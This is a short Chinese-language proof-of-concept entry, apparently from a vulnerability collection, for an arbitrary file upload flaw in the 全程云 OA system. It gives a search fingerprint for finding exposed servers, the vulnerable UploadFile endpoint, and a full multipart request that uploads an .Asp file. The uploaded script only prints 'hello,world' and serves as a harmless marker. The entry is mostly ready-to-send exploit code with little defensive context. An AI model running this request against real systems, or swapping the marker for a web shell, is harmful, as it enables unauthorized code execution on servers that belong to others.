# 全程云OAUploadFile存在任意文件上传漏洞

- **系统**：全程云　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="images/yipeoplehover.png"`
- **请求**：`POST /OA/api/2.0/Common/AttachFile/UploadFile HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryNe8DcVuv…`　`Content-Length: 191`

**请求体 / payload**
```
------WebKitFormBoundaryNe8DcVuv1vEUWDaR
Content-Disposition: form-data; name="upload";filename="123.Asp"
<% response.write("hello,world") %>
------WebKitFormBoundaryNe8DcVuv1vEUWDaR--
```
- **预期**：200　|　—